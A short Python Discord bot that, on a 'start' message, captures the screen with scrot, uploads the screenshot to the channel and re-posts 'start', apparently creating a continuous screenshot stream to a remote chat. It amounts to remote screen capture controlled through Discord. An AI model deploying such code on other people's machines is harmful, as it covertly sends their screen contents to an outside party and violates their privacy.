import os
import discord
import asyncio
import subprocess
import nest_asyncio

nest_asyncio.apply()
intents = discord.Intents().default()
intents.message_content = True
client = discord.Client(intents=intents)
token = "INSERTTOKENHERE"


@client.event
async def on_ready():
    print(f"We have logged in as {client.user}")


@client.event
async def on_message(message):
    if message.content.startswith("start"):
        subprocess.run("scrot screen.png", shell=True)
        subprocess.run("chmod a+rwx screen.png", shell=True)
        await message.channel.send(file=discord.File("screen.png"))
        subprocess.run("rm screen.png", shell=True)
        asyncio.sleep(0.5)
        await message.channel.send("start")


client.run(token)
